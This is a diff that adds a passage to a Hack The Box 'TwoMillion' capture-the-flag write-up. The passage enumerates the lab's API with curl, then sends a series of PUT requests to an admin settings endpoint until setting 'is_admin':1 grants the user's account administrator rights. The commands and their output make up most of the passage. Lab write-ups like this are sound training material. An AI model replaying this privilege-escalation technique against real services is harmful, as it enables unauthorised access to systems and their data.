@@ -293,3 +293,123 @@ Base64 Decode
 6KLBS-3MFIN-OZQUF-O6C3Z%
 ```
 
+Register
+```shell
+http://2million.htb/invite
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3d225e76-2d0a-41a6-8d0e-5f6c792ddee0)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8bdaef19-dff6-4fb9-8fbe-84262249fee2)
+
+Login
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dfda5f9d-2ee7-4804-bb13-cc0e69c0f0d5)
+
+Dashboard
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c5534874-fd6b-4bbf-ba45-d75e259166fd)
+
+API Routes
+```shell
+> curl -vvv http://2million.htb/api/v1 -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" | jq
+* processing: http://2million.htb/api/v1
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> GET /api/v1 HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.2.1
+> Accept: */*
+> Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj
+> 
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Wed, 11 Oct 2023 04:18:54 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+{ [812 bytes data]
+100   800    0   800    0     0   4111      0 --:--:-- --:--:-- --:--:--  4494
+* Connection #0 to host 2million.htb left intact
+{
+  "v1": {                                                                                                                                      
+    "user": {                                                                                                                                  
+      "GET": {                                                                                                                                 
+        "/api/v1": "Route List",                                                                                                               
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",                                                            
+        "/api/v1/invite/generate": "Generate invite code",                                                                                     
+        "/api/v1/invite/verify": "Verify invite code",                                                                                         
+        "/api/v1/user/auth": "Check if user is authenticated",                                                                                 
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",                                                                       
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",                                                                         
+        "/api/v1/user/vpn/download": "Download OVPN file"                                                                                      
+      },                                                                                                                                       
+      "POST": {                                                                                                                                
+        "/api/v1/user/register": "Register a new user",                                                                                        
+        "/api/v1/user/login": "Login with existing user"                                                                                       
+      }                                                                                                                                        
+    },                                                                                                                                         
+    "admin": {                                                                                                                                 
+      "GET": {                                                                                                                                 
+        "/api/v1/admin/auth": "Check if user is admin"                                                                                         
+      },                                                                                                                                       
+      "POST": {                                                                                                                                
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"                                                                         
+      },                                                                                                                                       
+      "PUT": {                                                                                                                                 
+        "/api/v1/admin/settings/update": "Update user settings"                                                                                
+      }                                                                                                                                        
+    }                                                                                                                                          
+  }                                                                                                                                            
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0a5d775c-6d54-4420-a378-4cddbdb99ac5)
+
+
+```shell
+> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" | jq
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ea64fd6f-fc38-4d78-b85c-3be08efe7c51)
+
+```shell
+> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" | jq
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/76649027-b14f-4208-88a4-c286f10a4970)
+
+```shell
+> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com"}' | jq
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e9e4b484-aec8-42a5-9ea2-456073f1671c)
+
+```shell
+> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":""}' | jq
+{
+  "status": "danger",
+  "message": "Variable is_admin needs to be either 0 or 1."
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5fa4a6cc-4df6-41b0-8dec-5ce4c21de908)
+
+```shell
+> curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=ikb47nrfofodqdubcc6k0i3hkj" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":1}' | jq
+{
+  "id": 13,
+  "username": "attacker",
+  "is_admin": 1
+}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5366cdd3-3806-4c4e-ad45-b518cb9fe6ca)
